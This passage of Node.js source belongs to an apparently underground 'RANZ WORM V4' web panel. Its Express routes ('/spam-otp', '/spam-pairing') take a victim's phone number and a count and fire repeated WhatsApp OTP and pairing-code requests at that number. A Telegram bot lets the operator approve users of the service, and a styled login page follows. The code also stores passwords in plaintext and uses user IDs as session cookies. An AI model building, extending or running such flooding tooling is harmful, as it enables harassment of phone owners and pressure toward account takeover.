                    const { connection, lastDisconnect, qr } = update;

                    if (connection === "close") {
                        const statusCode = lastDisconnect?.error?.output?.statusCode;
                        global.sessions?.delete?.(BotNumber);

                        if (statusCode === DisconnectReason.loggedOut) {
                            try { eventCallback(username, { type: 'error', message: 'Device logged out', number: BotNumber, status: 'logged_out', progress: 0 }); } catch(e) {}
                            safeDeleteDir(sessionDir);
                            cleanup();
                            reject(new Error("Logged out"));
                            return;
                        }

                        if (statusCode === DisconnectReason.restartRequired ||
                            statusCode === DisconnectReason.timedOut ||
                            statusCode === DisconnectReason.connectionLost) {
                            if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
                                reconnectAttempts++;
                                try { eventCallback(username, { type: 'status', message: `Reconnecting (${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS})...`, number: BotNumber, status: 'reconnecting', progress: 30 + reconnectAttempts * 10 }); } catch(e) {}
                                setTimeout(async () => {
                                    try {
                                        resolve(await connectToWhatsAppUser(username, BotNumber, sessionDir, eventCallback));
                                    } catch(e) { reject(e); }
                                }, 5000);
                                return;
                            }
                        }

                        if (!isConnected) {
                            cleanup();
                            reject(new Error(`Connection failed: ${statusCode}`));
                        }
                    }

                    if (connection === "open") {
                        isConnected = true;
                        cleanup();
                        if (global.sessions) global.sessions.set(BotNumber, userSock);
                        try { eventCallback(username, { type: 'success', message: 'WhatsApp Connected!', number: BotNumber, status: 'connected', progress: 100 }); } catch(e) {}
                        resolve(userSock);
                    }

                    if (connection === "connecting") {
                        try { eventCallback(username, { type: 'status', message: 'Connecting...', number: BotNumber, status: 'connecting', progress: 45 }); } catch(e) {}

                        if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
                            pairingCodeGenerated = true;
                            setTimeout(async () => {
                                try {
                                    try { eventCallback(username, { type: 'status', message: 'Requesting pairing code...', number: BotNumber, status: 'requesting_code', progress: 55 }); } catch(e) {}
                                    const code = await userSock.requestPairingCode(BotNumber);
                                    const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code || 'Unknown';
                                    try {
                                        eventCallback(username, {
                                            type: 'pairing_code', message: 'Pairing Code:', number: BotNumber,
                                            code: formattedCode, status: 'waiting_pairing', progress: 65,
                                            instructions: ['Buka WhatsApp > Linked Devices > Link a Device', `Kode: ${formattedCode}`]
                                        });
                                    } catch(e) {}
                                } catch (err) {
                                    try { eventCallback(username, { type: 'error', message: `Failed: ${err.message}`, number: BotNumber, status: 'code_error', progress: 0 }); } catch(e) {}
                                }
                            }, 3000);
                        }
                    }

                    if (qr) {
                        try {
                            const qrDataUrl = await QRCode.toDataURL(qr);
                            try { eventCallback(username, { type: 'qr', message: 'Scan QR:', number: BotNumber, qr: qrDataUrl, status: 'waiting_qr', progress: 65 }); } catch(e) {}
                        } catch(e) {}
                    }
                } catch (err) {
                    Logger.error(`[CONNECTION UPDATE] ${err.message}`);
                }
            });

            userSock.ev.on("creds.update", saveCreds);

            connectionTimeout = setTimeout(() => {
                if (!isConnected) {
                    cleanup();
                    try { eventCallback(username, { type: 'error', message: 'Timeout 180s', number: BotNumber, status: 'timeout', progress: 0 }); } catch(e) {}
                    reject(new Error("Timeout"));
                }
            }, 180000);
        });
    } catch (err) {
        try { eventCallback(username, { type: 'error', message: `Error: ${err.message}`, number: BotNumber, status: 'error', progress: 0 }); } catch(e) {}
        throw err;
    }
}

// =============================================
// TELEGRAM BOT - SAFE INIT
// =============================================
let bot = null;

function initTelegramBot() {
    try {
        bot = new TelegramBot(CONFIG.BOT_TOKEN, {
            polling: {
                autoStart: true,
                interval: 1000,
                params: { timeout: 10 }
            }
        });

        global.bot = bot;

        bot.on('polling_error', (error) => {
            Logger.error(`Telegram polling error: ${error.message}`);
            if (error.message.includes('ETELEGRAM')) {
                setTimeout(() => {
                    try { bot.stopPolling().then(() => bot.startPolling()); } catch(e) {}
                }, 5000);
            }
        });

        bot.on('error', (error) => {
            Logger.error(`Telegram error: ${error.message}`);
        });

        bot.on('webhook_error', (error) => {
            Logger.error(`Telegram webhook error: ${error.message}`);
        });

        // Bot commands
        bot.onText(/\/start/, (msg) => {
            safeExecute(() => {
                const chatId = msg.chat.id;
                const firstName = msg.from?.first_name || 'User';
                const isOwner = chatId === CONFIG.OWNER_ID;

                const menu = `╔══════════════════════════╗
║  🐍 RANZ WORM V4 🐍      ║
╠══════════════════════════╣
║  Welcome, ${firstName}!
╠══════════════════════════╣
║  /start   - Menu
║  /status  - Server status
║  /help    - Help
${isOwner ? `
║  /users   - User list
║  /pending - Pending list
║  /approve [id] - Approve
║  /reject [id]  - Reject
` : `
║  /register [user] [pass]
║  /myid     - Your ID
`}
╚══════════════════════════╝
@Ranzkecebet`;

                bot.sendMessage(chatId, menu).catch(() => {});
            }, null, 'Telegram /start');
        });

        bot.onText(/\/register (.+) (.+)/, (msg, match) => {
            safeExecute(() => {
                const chatId = msg.chat.id;
                const username = match[1].trim();
                const password = match[2].trim();

                const users = safeReadJSON(CONFIG.USERS_FILE, DEFAULT_USERS);
                const pending = safeReadJSON(CONFIG.PENDING_FILE, DEFAULT_PENDING);

                if (users.users?.find(u => u.username === username)) {
                    return bot.sendMessage(chatId, '❌ Username exists.').catch(() => {});
                }

                if (pending.pending?.find(p => p.username === username)) {
                    return bot.sendMessage(chatId, '⏳ Already pending.').catch(() => {});
                }

                const pendingId = crypto.randomBytes(4).toString('hex');
                pending.pending = pending.pending || [];
                pending.pending.push({
                    id: pendingId, username, password, telegramId: chatId,
                    telegramName: msg.from?.first_name || 'Unknown',
                    requestedAt: moment().format('YYYY-MM-DD HH:mm:ss'), status: 'pending'
                });
                safeWriteJSON(CONFIG.PENDING_FILE, pending);

                bot.sendMessage(CONFIG.OWNER_ID, `🔔 NEW: ${username}\nID: ${pendingId}\n/approve_${pendingId} | /reject_${pendingId}`).catch(() => {});
                bot.sendMessage(chatId, `⏳ Pending. ID: ${pendingId}`).catch(() => {});
            }, null, 'Telegram /register');
        });

        bot.on('callback_query', (q) => {
            safeExecute(() => {
                const chatId = q.message?.chat?.id;
                if (chatId !== CONFIG.OWNER_ID) return bot.answerCallbackQuery(q.id, { text: 'Unauthorized' }).catch(() => {});

                const data = q.data;
                const pending = safeReadJSON(CONFIG.PENDING_FILE, DEFAULT_PENDING);

                if (data?.startsWith('approve_')) {
                    const pid = data.replace('approve_', '');
                    const pu = pending.pending?.find(p => p.id === pid);
                    if (!pu) return bot.answerCallbackQuery(q.id, { text: 'Not found' }).catch(() => {});

                    const users = safeReadJSON(CONFIG.USERS_FILE, DEFAULT_USERS);
                    users.users = users.users || [];
                    users.users.push({
                        id: crypto.randomBytes(8).toString('hex'),
                        username: pu.username, password: pu.password,
                        telegramId: pu.telegramId,
                        registeredAt: moment().format('YYYY-MM-DD HH:mm:ss'), status: 'active'
                    });
                    safeWriteJSON(CONFIG.USERS_FILE, users);

                    pending.pending = pending.pending.filter(p => p.id !== pid);
                    safeWriteJSON(CONFIG.PENDING_FILE, pending);

                    bot.editMessageText(`✅ Approved: ${pu.username}`, { chat_id: chatId, message_id: q.message.message_id }).catch(() => {});
                    bot.sendMessage(pu.telegramId, '✅ Approved! Silakan login.').catch(() => {});
                    bot.answerCallbackQuery(q.id, { text: 'Approved' }).catch(() => {});
                }

                if (data?.startsWith('reject_')) {
                    const pid = data.replace('reject_', '');
                    const pu = pending.pending?.find(p => p.id === pid);
                    if (!pu) return bot.answerCallbackQuery(q.id, { text: 'Not found' }).catch(() => {});

                    pending.pending = pending.pending.filter(p => p.id !== pid);
                    safeWriteJSON(CONFIG.PENDING_FILE, pending);

                    bot.editMessageText(`❌ Rejected: ${pu.username}`, { chat_id: chatId, message_id: q.message.message_id }).catch(() => {});
                    bot.sendMessage(pu.telegramId, '❌ Rejected.').catch(() => {});
                    bot.answerCallbackQuery(q.id, { text: 'Rejected' }).catch(() => {});
                }
            }, null, 'Telegram callback');
        });

        bot.onText(/\/approve_(.+)/, (msg, match) => {
            safeExecute(() => {
                if (msg.chat.id !== CONFIG.OWNER_ID) return;
                const pending = safeReadJSON(CONFIG.PENDING_FILE, DEFAULT_PENDING);
                const pu = pending.pending?.find(p => p.id === match[1].trim());
                if (!pu) return bot.sendMessage(msg.chat.id, 'Not found.').catch(() => {});

                const users = safeReadJSON(CONFIG.USERS_FILE, DEFAULT_USERS);
                users.users = users.users || [];
                users.users.push({
                    id: crypto.randomBytes(8).toString('hex'),
                    username: pu.username, password: pu.password,
                    telegramId: pu.telegramId,
                    registeredAt: moment().format('YYYY-MM-DD HH:mm:ss'), status: 'active'
                });
                safeWriteJSON(CONFIG.USERS_FILE, users);

                pending.pending = pending.pending.filter(p => p.id !== match[1].trim());
                safeWriteJSON(CONFIG.PENDING_FILE, pending);

                bot.sendMessage(msg.chat.id, `✅ Approved: ${pu.username}`).catch(() => {});
                bot.sendMessage(pu.telegramId, '✅ Approved!').catch(() => {});
            }, null, 'Telegram approve');
        });

        bot.onText(/\/reject_(.+)/, (msg, match) => {
            safeExecute(() => {
                if (msg.chat.id !== CONFIG.OWNER_ID) return;
                const pending = safeReadJSON(CONFIG.PENDING_FILE, DEFAULT_PENDING);
                const pu = pending.pending?.find(p => p.id === match[1].trim());
                if (!pu) return bot.sendMessage(msg.chat.id, 'Not found.').catch(() => {});

                pending.pending = pending.pending.filter(p => p.id !== match[1].trim());
                safeWriteJSON(CONFIG.PENDING_FILE, pending);

                bot.sendMessage(msg.chat.id, `❌ Rejected: ${pu.username}`).catch(() => {});
                bot.sendMessage(pu.telegramId, '❌ Rejected.').catch(() => {});
            }, null, 'Telegram reject');
        });

        bot.onText(/\/users/, (msg) => {
            safeExecute(() => {
                if (msg.chat.id !== CONFIG.OWNER_ID) return;
                const users = safeReadJSON(CONFIG.USERS_FILE, DEFAULT_USERS);
                if (!users.users?.length) return bot.sendMessage(msg.chat.id, 'No users.').catch(() => {});
                const list = users.users.map((u, i) => `${i+1}. ${u.username} (${u.status})`).join('\n');
                bot.sendMessage(msg.chat.id, `👥 Users:\n${list}`).catch(() => {});
            }, null, 'Telegram /users');
        });

        bot.onText(/\/pending/, (msg) => {
            safeExecute(() => {
                if (msg.chat.id !== CONFIG.OWNER_ID) return;
                const pending = safeReadJSON(CONFIG.PENDING_FILE, DEFAULT_PENDING);
                if (!pending.pending?.length) return bot.sendMessage(msg.chat.id, 'No pending.').catch(() => {});
                const list = pending.pending.map(p => `${p.username} - /approve_${p.id} /reject_${p.id}`).join('\n');
                bot.sendMessage(msg.chat.id, `⏳ Pending:\n${list}`).catch(() => {});
            }, null, 'Telegram /pending');
        });

        bot.onText(/\/status/, (msg) => {
            safeExecute(() => {
                const users = safeReadJSON(CONFIG.USERS_FILE, DEFAULT_USERS);
                const pending = safeReadJSON(CONFIG.PENDING_FILE, DEFAULT_PENDING);
                bot.sendMessage(msg.chat.id, `🟢 Online | Users: ${users.users?.length || 0} | Pending: ${pending.pending?.length || 0} | Port: ${CONFIG.PORT}`).catch(() => {});
            }, null, 'Telegram /status');
        });

        bot.onText(/\/myid/, (msg) => {
            safeExecute(() => bot.sendMessage(msg.chat.id, `ID: ${msg.chat.id}`).catch(() => {}), null, 'Telegram /myid');
        });

        bot.onText(/\/help/, (msg) => {
            safeExecute(() => bot.sendMessage(msg.chat.id, '📚 Daftar: /register [user] [pass]\nLogin di website.\n@Ranzkecebet').catch(() => {}), null, 'Telegram /help');
        });

        Logger.success('Telegram Bot initialized successfully');
        return true;
    } catch (err) {
        Logger.error(`Failed to initialize Telegram Bot: ${err.message}`);
        bot = null;
        global.bot = null;
        return false;
    }
}

// =============================================
// SSE CALLBACKS
// =============================================
const userEventCallbacks = {};

function sendEventToUser(username, data) {
    safeExecute(() => {
        if (!username || !userEventCallbacks[username]) return;
        const safeData = typeof data === 'object' ? data : { message: String(data) };
        userEventCallbacks[username].forEach(cb => {
            try { cb(safeData); } catch(e) {}
        });
    }, null, 'sendEventToUser');
}

// =============================================
// ROUTES
// =============================================

// Login page
app.get('/', (req, res) => {
    safeExecute(() => {
        try {
            res.send(LOGIN_PAGE_HTML);
        } catch (err) {
            res.status(500).send('Error loading page');
        }
    }, null, 'GET /');
});

// Dashboard
app.get('/dashboard', (req, res) => {
    safeExecute(() => {
        try {
            res.send(DASHBOARD_HTML);
        } catch (err) {
            res.status(500).send('Error loading dashboard');
        }
    }, null, 'GET /dashboard');
});

// Login API
app.post('/login', (req, res) => {
    safeExecute(() => {
        const { username, password } = req.body || {};

        if (!username || !password) {
            return res.json({ status: 'error', message: 'Username and password required' });
        }

        const users = safeReadJSON(CONFIG.USERS_FILE, DEFAULT_USERS);
        const user = users.users?.find(u => u.username === username && u.password === password);

        if (!user) {
            return res.json({ status: 'error', message: 'Invalid username or password' });
        }

        if (user.status !== 'active') {
            return res.json({ status: 'error', message: 'Account not active. Wait for approval.' });
        }

        res.cookie('session', user.id, {
            maxAge: 3600000,
            httpOnly: true,
            secure: false,
            sameSite: 'lax'
        });

        Logger.info(`[LOGIN] ${username} logged in from ${getClientIP(req)}`);
        res.json({ status: 'success', username: user.username, userId: user.id });
    }, null, 'POST /login');
});

// Check session
app.get('/check-session', (req, res) => {
    safeExecute(() => {
        const sessionId = req.cookies?.session;
        if (!sessionId) return res.json({ status: 'error', message: 'No session' });

        const users = safeReadJSON(CONFIG.USERS_FILE, DEFAULT_USERS);
        const user = users.users?.find(u => u.id === sessionId);

        if (!user) return res.json({ status: 'error', message: 'Invalid session' });

        res.json({ status: 'success', username: user.username, userId: user.id });
    }, null, 'GET /check-session');
});

// Spam OTP
app.post('/spam-otp', async (req, res) => {
    try {
        const { target, count, username } = req.body || {};

        if (!target || !count || !username) {
            return res.json({ status: 'error', message: 'Missing parameters' });
        }

        const otpCount = Math.min(Math.max(parseInt(count) || 1, 1), CONFIG.MAX_OTP_COUNT);

        Logger.info(`[SPAM OTP] ${target} x${otpCount} by ${username}`);

        res.json({
            status: 'processing',
            message: `Starting ${otpCount} OTP spam to ${target}...`,
            target,
            count: otpCount
        });

        // Process in background
        spamOTPFull(target, otpCount, sendEventToUser, username)
            .then(results => {
                const sent = results.filter(r => r.status === 'sent').length;
                Logger.success(`[SPAM OTP DONE] ${sent}/${otpCount} sent`);
                Logger.log(`Spam OTP: ${target} - ${sent}/${otpCount} by ${username}`);
            })
            .catch(err => {
                Logger.error(`[SPAM OTP BG ERROR] ${err.message}`);
                try { sendEventToUser(username, { type: 'error', message: err.message, number: target, status: 'error' }); } catch(e) {}
            });

    } catch (err) {
        Logger.error(`[SPAM OTP ROUTE] ${err.message}`);
        res.json({ status: 'error', message: 'Internal server error' });
    }
});

// Spam Pairing
app.post('/spam-pairing', async (req, res) => {
    try {
        const { target, count, username } = req.body || {};

        if (!target || !count || !username) {
            return res.json({ status: 'error', message: 'Missing parameters' });
        }

        const pairCount = Math.min(Math.max(parseInt(count) || 1, 1), CONFIG.MAX_PAIRING_COUNT);

        Logger.info(`[SPAM PAIRING] ${target} x${pairCount} by ${username}`);

        res.json({
            status: 'processing',
            message: `Starting ${pairCount} pairing spam to ${target}...`,
            target,
            count: pairCount
        });

        spamPairingMultiple(username, target, pairCount, sendEventToUser)
            .then(results => {
                const sent = results.filter(r => r.status === 'sent').length;
                Logger.success(`[PAIRING DONE] ${sent}/${pairCount} sent`);
            })
            .catch(err => {
                Logger.error(`[PAIRING BG ERROR] ${err.message}`);
                try { sendEventToUser(username, { type: 'error', message: err.message, number: target, status: 'error' }); } catch(e) {}
            });

    } catch (err) {
        Logger.error(`[SPAM PAIRING ROUTE] ${err.message}`);
        res.json({ status: 'error', message: 'Internal server error' });
    }
});

// Connect WhatsApp
app.post('/connect-whatsapp', async (req, res) => {
    try {
        const { target, username } = req.body || {};

        if (!target || !username) {
            return res.json({ status: 'error', message: 'Missing parameters' });
        }

        const sessionDir = path.join(CONFIG.SESSIONS_DIR, `connect_${target}_${Date.now()}`);

        Logger.info(`[CONNECT WA] ${target} by ${username}`);

        res.json({
            status: 'processing',
            message: `Connecting to ${target}...`,
            target
        });

        connectToWhatsAppUser(username, target, sessionDir, sendEventToUser)
            .then(() => {
                Logger.success(`[CONNECT WA] ${target} connected`);
                Logger.log(`WA Connected: ${target} by ${username}`);
            })
            .catch(err => {
                Logger.error(`[CONNECT WA ERROR] ${err.message}`);
                try { sendEventToUser(username, { type: 'error', message: err.message, number: target, status: 'error' }); } catch(e) {}
            });

    } catch (err) {
        Logger.error(`[CONNECT WA ROUTE] ${err.message}`);
        res.json({ status: 'error', message: 'Internal server error' });
    }
});

// SSE Events
app.get('/events', (req, res) => {
    try {
        const username = req.query?.username;
        if (!username) return res.status(400).json({ error: 'Username required' });

        res.writeHead(200, {
            'Content-Type': 'text/event-stream',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Access-Control-Allow-Origin': '*',
            'X-Accel-Buffering': 'no'
        });

        res.write(`data: ${JSON.stringify({ type: 'connected', message: 'SSE connected' })}\n\n`);

        if (!userEventCallbacks[username]) userEventCallbacks[username] = [];

        const callback = (data) => {
            try {
                res.write(`data: ${JSON.stringify(data)}\n\n`);
            } catch(e) {}
        };

        userEventCallbacks[username].push(callback);

        // Keep alive
        const keepAlive = setInterval(() => {
            try { res.write(`: keepalive\n\n`); } catch(e) { clearInterval(keepAlive); }
        }, 15000);

        req.on('close', () => {
            clearInterval(keepAlive);
            if (userEventCallbacks[username]) {
                userEventCallbacks[username] = userEventCallbacks[username].filter(cb => cb !== callback);
                if (userEventCallbacks[username].length === 0) delete userEventCallbacks[username];
            }
        });

    } catch (err) {
        Logger.error(`[SSE] ${err.message}`);
        if (!res.headersSent) res.status(500).json({ error: 'Internal error' });
    }
});

// 404 handler
app.use((req, res) => {
    try {
        res.status(404).send('Not Found');
    } catch(e) {}
});

// Global error handler
app.use((err, req, res, next) => {
    Logger.error(`[EXPRESS ERROR] ${err.message}`);
    try {
        if (!res.headersSent) res.status(500).json({ error: 'Internal server error' });
    } catch(e) {}
});

// =============================================
// HTML PAGES
// =============================================

const LOGIN_PAGE_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RanzS - Atlantic Login</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;700&display=swap');
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:'Inter',sans-serif;
            background:#020008;
            min-height:100vh;
            display:flex;
            justify-content:center;
            align-items:center;
            overflow:hidden;
            position:relative;
        }
        #blackhole-canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none}
        .stars{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;pointer-events:none}
        .star{position:absolute;width:2px;height:2px;background:white;border-radius:50%;animation:twinkle var(--d) ease-in-out infinite;animation-delay:var(--delay)}
        @keyframes twinkle{0%,100%{opacity:.2;transform:scale(1)}50%{opacity:1;transform:scale(2)}}
        .container{position:relative;z-index:10;width:440px;max-width:95%}
        .card-wrapper{position:relative;padding:3px;border-radius:24px;background:transparent}
        .card-wrapper::before{
            content:'';position:absolute;inset:-2px;border-radius:26px;padding:2px;
            background:conic-gradient(from var(--angle),#fff 0%,#8b5cf6 15%,#fff 30%,#ec4899 45%,#fff 60%,#3b82f6 75%,#fff 90%,#8b5cf6 100%);
            -webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);
            -webkit-mask-composite:xor;mask-composite:exclude;
            animation:rotateBorder 6s linear infinite,rgbPulse 3s ease-in-out infinite;z-index:-1;
        }
        @keyframes rotateBorder{0%{--angle:0deg}100%{--angle:360deg}}
        @keyframes rgbPulse{0%,100%{filter:brightness(1) blur(0px)}50%{filter:brightness(1.3) blur(1px)}}
        .card-wrapper::after{content:'';position:absolute;inset:4px;border-radius:22px;background:rgba(5,3,20,.9);z-index:-1}
        .card{position:relative;z-index:1;background:transparent;border-radius:22px;padding:44px 32px 32px;backdrop-filter:blur(10px)}
        .card-glow{position:absolute;top:20%;left:10%;width:80%;height:60%;background:radial-gradient(ellipse at center,rgba(139,92,246,.15) 0%,rgba(236,72,153,.08) 30%,rgba(59,130,246,.05) 60%,transparent 100%);border-radius:50%;filter:blur(40px);animation:glowFloat 8s ease-in-out infinite;pointer-events:none;z-index:0}
        @keyframes glowFloat{0%,100%{transform:translate(0,0) scale(1)}25%{transform:translate(5%,-5%) scale(1.1)}50%{transform:translate(-3%,3%) scale(.95)}75%{transform:translate(-5%,-3%) scale(1.05)}}
        .card-content{position:relative;z-index:2}
        .logo-section{text-align:center;margin-bottom:28px}
        .logo-ring{width:80px;height:80px;margin:0 auto 20px;position:relative;display:flex;align-items:center;justify-content:center}
        .logo-ring::before{content:'';position:absolute;inset:-8px;border-radius:50%;border:2px solid transparent;border-top-color:#8b5cf6;border-right-color:#ec4899;border-bottom-color:#3b82f6;border-left-color:#06b6d4;animation:logoSpin 3s linear infinite}
        .logo-ring::after{content:'';position:absolute;inset:-16px;border-radius:50%;border:1px solid transparent;border-top-color:rgba(139,92,246,.4);border-bottom-color:rgba(236,72,153,.4);animation:logoSpin 6s linear infinite reverse}
        @keyframes logoSpin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .logo-inner{width:56px;height:56px;background:linear-gradient(135deg,#8b5cf6,#6d28d9,#4c1d95);border-radius:16px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 40px rgba(139,92,246,.5),0 0 80px rgba(139,92,246,.2);z-index:1}
        .logo-inner svg{width:28px;height:28px;fill:white;filter:drop-shadow(0 0 8px rgba(255,255,255,.5))}
        .system-title{font-family:'Orbitron',sans-serif;font-size:32px;font-weight:900;letter-spacing:4px;background:linear-gradient(135deg,#fff 0%,#8b5cf6 30%,#ec4899 60%,#fff 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:titleShine 3s ease-in-out infinite;margin-bottom:4px}
        @keyframes titleShine{0%,100%{filter:brightness(1)}50%{filter:brightness(1.3)}}
        .system-subtitle{font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:6px;color:rgba(255,255,255,.4);text-transform:uppercase}
        .badge{display:inline-block;margin-top:12px;padding:6px 16px;border:1px solid rgba(139,92,246,.3);border-radius:20px;font-size:10px;letter-spacing:3px;color:rgba(255,255,255,.5);font-family:'Orbitron',sans-serif;text-transform:uppercase;animation:badgeGlow 2s ease-in-out infinite}
        @keyframes badgeGlow{0%,100%{border-color:rgba(139,92,246,.3);box-shadow:0 0 5px rgba(139,92,246,.1)}50%{border-color:rgba(139,92,246,.6);box-shadow:0 0 15px rgba(139,92,246,.3)}}
        .input-group{margin-bottom:18px;position:relative}
        .input-label{display:block;font-size:11px;font-weight:600;letter-spacing:2px;color:rgba(255,255,255,.5);margin-bottom:8px;text-transform:uppercase;font-family:'Orbitron',sans-serif}
        .input-wrapper{position:relative}
        .input-icon{position:absolute;left:16px;top:50%;transform:translateY(-50%);color:rgba(255,255,255,.3);z-index:2;transition:color .3s}
        .input-field{width:100%;padding:14px 16px 14px 48px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);border-radius:14px;color:white;font-size:15px;font-family:'Inter',sans-serif;outline:none;transition:all .4s}
        .input-field:focus{border-color:#8b5cf6;box-shadow:0 0 25px rgba(139,92,246,.15),0 0 0 4px rgba(139,92,246,.05);background:rgba(139,92,246,.05)}
        .input-field::placeholder{color:rgba(255,255,255,.15)}
        .btn-wrapper{position:relative;margin-top:24px}
        .btn-glow{position:absolute;inset:-4px;border-radius:16px;background:conic-gradient(from 0deg,#fff,#8b5cf6,#fff,#ec4899,#fff,#3b82f6,#fff);opacity:0;filter:blur(10px);transition:opacity .4s}
        .btn-wrapper:hover .btn-glow{opacity:.6}
        .btn-submit{width:100%;padding:15px;background:linear-gradient(135deg,#8b5cf6,#6d28d9,#4c1d95);border:1px solid rgba(139,92,246,.4);border-radius:14px;color:white;font-size:15px;font-weight:700;letter-spacing:3px;font-family:'Orbitron',sans-serif;cursor:pointer;position:relative;z-index:1;transition:all .4s;text-transform:uppercase;overflow:hidden}
        .btn-submit:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(139,92,246,.5)}
        .btn-submit:disabled{opacity:.5;cursor:not-allowed;transform:none}
        .btn-submit::after{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.3),transparent);transition:left .6s}
        .btn-submit:hover::after{left:100%}
        .register-section{text-align:center;margin-top:24px;padding-top:20px;border-top:1px solid rgba(255,255,255,.05)}
        .register-text{font-size:13px;color:rgba(255,255,255,.4);margin-bottom:8px}
        .register-link{color:#8b5cf6;text-decoration:none;font-weight:600;transition:all .3s}
        .register-link:hover{color:#ec4899;text-shadow:0 0 10px rgba(236,72,153,.5)}
        .telegram-chip{display:inline-flex;align-items:center;gap:6px;background:rgba(0,136,204,.15);border:1px solid rgba(0,136,204,.3);border-radius:20px;padding:6px 14px;font-size:11px;color:#2ea6d6;margin-top:10px;font-family:'JetBrains Mono',monospace;letter-spacing:1px}
        .error-message{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);border-radius:12px;padding:12px 16px;color:#ef4444;font-size:13px;text-align:center;margin-top:16px;display:none;font-family:'JetBrains Mono',monospace}
        .error-message.show{display:block;animation:shake .5s ease}
        @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}
        .loading-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:1000;flex-direction:column;justify-content:center;align-items:center}
        .loading-overlay.show{display:flex}
        .loading-box{background:rgba(10,8,30,.95);border:1px solid rgba(139,92,246,.3);border-radius:20px;padding:40px;text-align:center;width:380px;max-width:90%;box-shadow:0 0 40px rgba(139,92,246,.2)}
        .loading-spinner{width:60px;height:60px;margin:0 auto 24px;position:relative}
        .loading-spinner::before{content:'';position:absolute;inset:0;border-radius:50%;border:3px solid transparent;border-top-color:#8b5cf6;border-right-color:#ec4899;animation:spin .8s linear infinite}
        .loading-spinner::after{content:'';position:absolute;inset:8px;border-radius:50%;border:2px solid transparent;border-bottom-color:#3b82f6;border-left-color:#06b6d4;animation:spin 1.2s linear infinite reverse}
        @keyframes spin{to{transform:rotate(360deg)}}
        .loading-title{font-family:'Orbitron',sans-serif;font-size:16px;color:white;letter-spacing:3px;margin-bottom:20px}
        .loading-steps{display:flex;flex-direction:column;gap:10px}
        .loading-step{display:flex;align-items:center;gap:10px;padding:10px 14px;background:rgba(255,255,255,.02);border-radius:10px;border:1px solid rgba(255,255,255,.04);transition:all .4s}
        .loading-step.done{border-color:rgba(34,197,94,.3);background:rgba(34,197,94,.05)}
        .step-dot{width:10px;height:10px;border-radius:50%;background:rgba(139,92,246,.3);transition:all .4s}
        .loading-step.done .step-dot{background:#22c55e;box-shadow:0 0 10px rgba(34,197,94,.5)}
        .step-label{font-size:12px;color:rgba(255,255,255,.5);font-family:'JetBrains Mono',monospace;transition:all .4s}
        .loading-step.done .step-label{color:#22c55e}
        .footer-text{text-align:center;margin-top:20px;font-size:10px;letter-spacing:3px;color:rgba(255,255,255,.15);font-family:'Orbitron',sans-serif;position:relative;z-index:10}
        @media(max-width:500px){.card{padding:36px 20px 24px}.system-title{font-size:24px}}
    </style>
</head>
<body>
    <canvas id="blackhole-canvas"></canvas>
    <div class="stars" id="stars"></div>
    <div class="container">
        <div class="card-wrapper">
            <div class="card">
                <div class="card-glow"></div>
                <div class="card-content">
                    <div class="logo-section">
                        <div class="logo-ring"><div class="logo-inner"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg></div></div>
                        <div class="system-title">RanzS</div>
                        <div class="system-subtitle">Atlantic Protocol</div>
                        <div class="badge">✦ Blackhole Access ✦</div>
                    </div>
                    <form id="login-form">
                        <div class="input-group">
                            <label class="input-label">Username</label>
                            <div class="input-wrapper">
                                <svg class="input-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/></svg>
                                <input type="text" class="input-field" id="username" placeholder="Enter your username" required autocomplete="off">
                            </div>
                        </div>
                        <div class="input-group">
                            <label class="input-label">Password</label>
                            <div class="input-wrapper">
                                <svg class="input-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                                <input type="password" class="input-field" id="password" placeholder="Enter your password" required>
                            </div>
                        </div>
                        <div class="error-message" id="login-error"></div>
                        <div class="btn-wrapper">
                            <div class="btn-glow"></div>
                            <button type="submit" class="btn-submit" id="submit-btn">Initialize</button>
                        </div>
                    </form>
                    <div class="register-section">
                        <p class="register-text">No access yet?</p>
                        <a href="https://t.me/RanzWormBot" target="_blank" class="register-link">Request via Telegram</a>
